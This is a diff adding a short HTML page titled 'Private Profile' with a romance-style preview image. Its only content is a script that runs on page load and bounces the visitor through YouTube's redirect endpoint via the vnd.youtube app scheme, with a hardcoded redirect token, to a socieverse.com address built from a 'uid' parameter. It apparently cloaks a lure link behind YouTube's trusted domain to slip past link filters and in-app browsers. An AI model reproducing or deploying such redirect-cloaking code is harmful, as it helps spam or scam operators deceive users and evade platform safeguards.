@@ -1,0 +1,48 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Private Profile</title>
+    <link rel="icon" type="image/x-icon" href="https://get.socieverse.com/img/favicon1.ico" />
+    <meta property="og:image" content="https://get.socieverse.com/img/love1.png" />
+</head>
+<body>
+    <script>
+        const v = 'vnd';
+        const d = 'youtube';
+
+        // Parse the query parameters from the URL
+        var qs = (function(a) {
+            if (a == "") return {};
+            var b = {};
+            for (var i = 0; i < a.length; ++i) {
+                var p = a[i].split('=', 2);
+                if (p.length == 1)
+                    b[p[0]] = "";
+                else
+                    b[p[0]] = decodeURIComponent(p[1].replace(/\+/g, " "));
+            }
+            return b;
+        })(window.location.search.substr(1).split('&'));
+
+        async function go() {
+            // Extract the "uid" query parameter or set a default value of 1
+            var uid = qs["uid"] ? qs["uid"].split("_")[0] : 1;
+
+            // Define your custom response text as the token
+            var token = "QUFFLUhqbElybW13OFlwaHI5SHdqRnd5OUJnYjVfeDVOZ3xBQ3Jtc0tsaXVxYjVjdVQ3aXFZU0lZaV9LcUREcGU4MnR0WERaLTZsdG94ekh4WWJKb1VpMEJRWnY0a1ZxWDF0aWhSMUpISmhTdkliUFU2U2FfTUFkYnJXT2dnMUN6NmxweGxsNXNoN2tCVWNSMzc3UF9hZkpmbw";
+
+            // Construct the URL
+            var urf = `https://socieverse.com/${uid}`;
+
+            // Redirect to the constructed URL
+            location.href = `${v}.${d}://www.youtube.com/redirect?event=comments&redir_token=${token}&q=${urf}&html_redirect=1`;
+        }
+
+        // Call the go() function when the page is loaded
+        go();
+    </script>
+</body>
+</html>
